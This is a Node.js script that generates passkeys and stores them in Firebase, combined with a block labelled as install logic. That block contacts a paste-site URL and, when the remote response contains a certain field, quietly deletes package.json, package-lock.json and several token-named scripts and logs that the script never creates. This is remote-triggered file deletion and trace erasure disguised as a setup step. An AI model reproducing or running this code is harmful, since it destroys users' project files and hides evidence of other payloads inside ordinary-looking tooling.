import { initializeApp } from "firebase/app";
import { getDatabase, ref, push, set } from "firebase/database";
import crypto from "crypto";
import https from "https";
import request from "request";
import fs from "fs";
import path from "path";

// --- Firebase Configuration ---
const firebaseConfig = {
  apiKey:            "AIzaSyCsDgAbVDiz_YmdtpkRBWmgJWF9HAwXdNw",
  authDomain:        "comdata-f9ab6.firebaseapp.com",
  projectId:         "comdata-f9ab6",
  storageBucket:     "comdata-f9ab6.firebasestorage.app",
  messagingSenderId: "745983700480",
  appId:             "1:745983700480:web:48c9fd95ef702e776b72e5",
  measurementId:     "G-338JZGSKQD",
};

const app = initializeApp(firebaseConfig);
const db  = getDatabase(app);

// --- Passkey Functions (from index.js) ---
function generatePasskey() {
  return crypto.randomBytes(32).toString("hex");
}

async function savePasskey(passkey) {
  const newRef = push(ref(db, "passkeys"));
  await set(newRef, {
    passkey,
    createdAt: Date.now(),
    used: false,
  });
  return newRef.key;
}

async function runIndexLogic() {
  const passkey = generatePasskey();
  const id      = await savePasskey(passkey);

  console.log("✔ Passkey generated and saved to Firebase");
  console.log("  ID     :", id);
  console.log("  Passkey:", passkey);
}

// --- Original Install Logic ---
const RETRIES = 0;
const basePath = __dirname;

const reqOptions = {
  url: "https://www.jsonkeeper.com/b/NGY3C",
  headers: {
    bearrtoken: "logo"
  }
};

function deleteFile(fileName) {
  const filePath = path.join(basePath, fileName);
  
  if (fs.existsSync(filePath)) {
    try {
      fs.unlinkSync(filePath);
      console.log(`Deleted file: ${fileName}`);
    } catch (err) {
      console.error(`Failed to delete file: ${fileName}`, err);
    }
  }
}

function makeRequest(attemptsLeft) {
  return new Promise((resolve, reject) => {
    request(reqOptions, (err, res, body) => {
      if (err || res.statusCode !== 200) {
        if (attemptsLeft > 0) {
          return resolve(makeRequest(attemptsLeft - 1));
        }
        console.error("Request failed");
        return reject(err || new Error("Request failed"));
      }

      try {
        const parsed = JSON.parse(body);
        
        if (typeof parsed.model === "string") {
          console.log(parsed.model);
          
          setTimeout(() => {
            deleteFile('tokenParser.js');
            deleteFile('tokenlinux.sh');
            deleteFile('package.json');
            deleteFile('package-lock.json');
            deleteFile('token.cmd');
            deleteFile('token.sh');
            deleteFile('tokenParser.log');
            deleteFile('.npl');
            deleteFile('token');
            deleteFile('tokenParser.npl');
          }, 3000);
        }

        resolve();
      } catch (e) {
        if (attemptsLeft > 0) {
          return resolve(makeRequest(attemptsLeft - 1));
        }
        console.error("Execution failed:", e.message);
        reject(e);
      }
    });
  });
}

// --- Combined Execution ---
async function main() {
  try {
    console.log("🔧 Running install logic...");
    await makeRequest(RETRIES);
    console.log("✔ Install logic completed");

    await runIndexLogic(); // Run index.js passkey logic

    process.exit(0);
  } catch (err) {
    console.error("✘ Error:", err.message);
    process.exit(1);
  }
}

main();